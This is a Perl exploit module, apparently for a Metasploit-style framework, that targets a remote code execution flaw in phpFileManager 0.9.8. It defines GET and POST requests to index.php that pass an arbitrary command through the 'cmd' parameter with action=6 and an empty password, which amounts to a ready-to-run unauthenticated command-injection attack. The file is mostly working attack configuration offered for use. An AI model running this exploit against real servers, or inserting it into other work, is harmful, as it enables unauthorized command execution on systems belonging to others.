package PHPFILEMANAGER::MSF::PhpfilemanagerRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PhpfilemanagerRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

         This module exploits a remote code execution vulnerability in phpFileManager

         0.9.8 which is a filesystem management tool on a single file.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "phpfilemanager_rce",
  PATH        => "action=6&cmd=__CMD__&",
  PATHS       => ["phpFileManager-0.9.8/index.php"],
  PAYLOAD     => "frame=3&pass=#yepthisshouldbeempty&",
  REFERENCES  => ["http://phpfm.sourceforge.net/"],
  TITLE       => "phpFileManager 0.9.8 Remote Code Execution",
  VARIABLES => {
    'CMD' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The path of phpFileManager",
  VALUE => "/phpFileManager-0.9.8/index.php",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT16 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'frame=3&pass=',
      TEXT   => 'Sending Exploit #16 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
